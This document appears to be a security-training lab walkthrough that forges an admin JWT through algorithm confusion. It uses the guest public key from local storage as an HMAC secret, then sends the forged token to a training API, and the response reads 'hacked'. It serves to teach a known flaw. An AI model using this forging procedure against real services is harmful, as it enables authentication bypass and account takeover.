## Algorithm Confussion
##### Step 1:

* Open Terminal
* Run `mkdir jwt_exp`
* Run: `cd jwt_exp`
* Run: `wget https://raw.githubusercontent.com/we45/AppSecEssentials/master/instructions/JWT/Algorithm-Confusion/token_gen.js`
* Run `npm install jsonwebtoken@4.2.0 colors`

##### Step 2:

* Open browser

##### Step 3:

* open `http://sls-training-ui.s3-website-us-east-1.amazonaws.com/` to access the XML-Uploder application.

![](img/login-page.png)

##### Step 4:

* Right click on top of the browser and click on `Web Developer` to select the `Storage Inspect` tab.

![](img/local-storage.png)

##### Step 5:

* Click on `Local-Storage` icon on left, and expand.

    * Copy the `guest_public_key` and `guest_token`
    
    ![](img/click-local-storage.png)


##### Step 6:
* Open Terminal and run `pbpaste | base64 -d >> public_key.pem`

##### Step 7: 

* Run `node token_gen.js --file public_key.pem --username admin`

   **Note:** Copy the token


    ```commandline
    root@we45-VirtualBox:/home/we45# node token_gen.js --file public_key.pem --username admin

    This is your token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwic3RhdHVzIjoiaGFja2VkIiwiaWF0IjoxNTM3ODk1Mjc0fQ.XFhJRm1W_58ulrgVJ9_vy7LsGy14VICXCLMQsh8g-nE

    ```

##### Step 8:

* Run `http GET https://3u97ne6l2g.execute-api.us-east-1.amazonaws.com/latest/confusion Authorization:<copied token>`

    ```commandline
    root@we45-VirtualBox:/home/we45# http GET https://3u97ne6l2g.execute-api.us-east-1.amazonaws.com/latest/confusion Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwic3RhdHVzIjoiaGFja2VkIiwiaWF0IjoxNTM3ODgwMjg2fQ.29E-i4QD21pvpA41oEJx60haJoOpgqbpzbvE6OK-Exg
    HTTP/1.1 200 OK
    Access-Control-Allow-Credentials: true
    Access-Control-Allow-Headers: Content-Type,Authorization,X-Amz-Date,X-Api-Key,X-Amz-Security-Token
    Access-Control-Allow-Methods: GET,OPTIONS
    Access-Control-Allow-Origin: *
    Access-Control-Max-Age: 0
    Connection: keep-alive
    Content-Length: 114
    Content-Type: application/json
    Date: Tue, 25 Sep 2018 17:12:14 GMT
    Via: 1.1 5bc1c4711561ec9e65e05f2ef18f000a.cloudfront.net (CloudFront)
    X-Amz-Cf-Id: JquwGQ1bb1vr5ev4oFF6R8e5MqbzM-YqyVvEJJKaz7fPN0nRlly3rw==
    X-Amzn-Trace-Id: Root=1-5baa6c6d-a196d3961775849ef9a9ffc4;Sampled=1
    X-Cache: Miss from cloudfront
    X-Success-Request: true
    x-amz-apigw-id: NyXhKFUHoAMFscA=
    x-amzn-RequestId: 25718e25-c0e6-11e8-86e5-dddb808cd601
    
    {
        "decoded": {
            "iat": 1537880286, 
            "status": "hacked", 
            "username": "admin"
        }, 
        "success": "You are successfully authenticated"
    }
    
    ```
